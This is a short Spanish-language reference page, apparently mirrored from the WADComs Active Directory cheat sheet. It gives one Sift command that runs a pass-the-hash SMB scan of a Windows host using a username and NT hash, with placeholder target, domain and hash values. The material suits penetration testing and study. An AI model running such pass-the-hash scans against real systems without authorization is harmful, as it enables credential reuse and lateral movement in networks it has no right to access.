# WADComs: Sift-Network-PTH

[[00-inicio|Inicio]] · [[Referencias|Referencias]] · [[WADComs|Índice WADComs]]

> Fuente: [https://wadcoms.github.io/](https://wadcoms.github.io/) · Licencia: **GPL-3.0** · Espejo local generado desde el repositorio oficial.

WADComs — comandos para Active Directory, ordenados por lo que TENES.

**Lo que tenés:** `Username`, `Hash`

**Sistema:** `Windows`

## Descripción

Sift supports NTLMv2 pass-the-hash for targeted SMB scans. This command scans one Windows host using a username and NT hash.

Command Reference:

  Target IP: 10.10.10.1

  Domain: test.local

  Username: john

  Hash: 5fbc3d5fec8206a30f4b6c473d68ae76

## Comando

```bash
.\sift.exe network --device 10.10.10.1 --username john --nt-hash 5fbc3d5fec8206a30f4b6c473d68ae76 --domain test.local --output sift-findings.log
```

## Referencias

- https://github.com/Stratus-Security/Sift
